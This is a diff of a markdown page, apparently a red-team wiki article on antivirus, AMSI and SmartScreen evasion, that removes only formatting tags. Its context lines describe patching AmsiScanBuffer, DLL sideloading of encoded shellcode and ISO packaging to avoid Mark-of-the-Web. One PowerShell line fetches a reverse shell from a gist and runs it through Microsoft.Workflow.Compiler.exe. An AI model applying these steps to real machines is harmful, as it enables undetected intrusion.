@@ -34,9 +34,9 @@ Sometimes all you need to do is change some strings in your binary or script to 
 
 If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.
 
-{% hint style="info" %}
+
 A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.
-{% endhint %}
+
 
 I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.
 
@@ -62,9 +62,9 @@ For example, if you want to dump LSASS, **do you really need to use mimikatz**? 
 
 The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.
 
-{% hint style="info" %}
+
 When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.
-{% endhint %}
+
 
 ## EXEs vs DLLs
 
@@ -130,9 +130,9 @@ Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the
 
 <figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
-{% hint style="info" %}
+
 I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG\_WNpE) to learn more about what we've discussed more in-depth.
-{% endhint %}
+
 
 ## ****[**Freeze**](https://github.com/optiv/Freeze)****
 
@@ -149,9 +149,9 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 
 <figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
-{% hint style="info" %}
+
 Evasion is just a cat & mouse game, what works today could be detected tomorrow, so never rely on only one tool, if possible, try chaining multiple evasion techniques.
-{% endhint %}
+
 
 ## AMSI (Anti-Malware Scan Interface)
 
@@ -219,9 +219,9 @@ Keep in mind, that this will probably get flagged once this post comes out, so y
 
 This technique was initially discovered by [@RastaMouse](https://twitter.com/\_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E\_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.
 
-{% hint style="info" %}
+
 Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.
-{% endhint %}
+
 
 There are also many other techniques used to bypass AMSI with powershell, check out [this repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.
 
@@ -239,9 +239,9 @@ SmartScreen mainly works with a reputation-based approach, meaning that uncommon
 
 <figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>
 
-{% hint style="info" %}
+
 It's important to note that executables signed with a **trusted** signing certificate **won't trigger SmartScreen**.
-{% endhint %}
+
 
 A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.
 
@@ -297,9 +297,9 @@ It's about injecting the post-exploitation malicious code **into its own process
 
 <figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>
 
-{% hint style="info" %}
+
 If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
-{% endhint %}
+
 
 You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).
 
@@ -311,11 +311,11 @@ Every environment you go against will have their own strengths and weaknesses.
 
 I highly encourage you go watch this talk from [@ATTL4S](https://twitter.com/DaniLJ94), to get a foothold into more Advanced Evasion techniques.
 
-{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}
+
 
 his is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.
 
-{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}
+
 
 
 
@@ -508,7 +508,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
 ```
 
-{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}
+
 
 C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
@@ -528,9 +528,9 @@ Merlin, Empire, Puppy, SalsaTools https://astr0baby.wordpress.com/2013/10/17/cus
 
 https://github.com/l0ss/Grouper2
 
-{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" %}
 
-{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}
+
+
 
 ### Other tools
 
@@ -561,7 +561,7 @@ https://github.com/praetorian-code/vulcan
 
 ### More
 
-{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}
+
 
 <details>
 
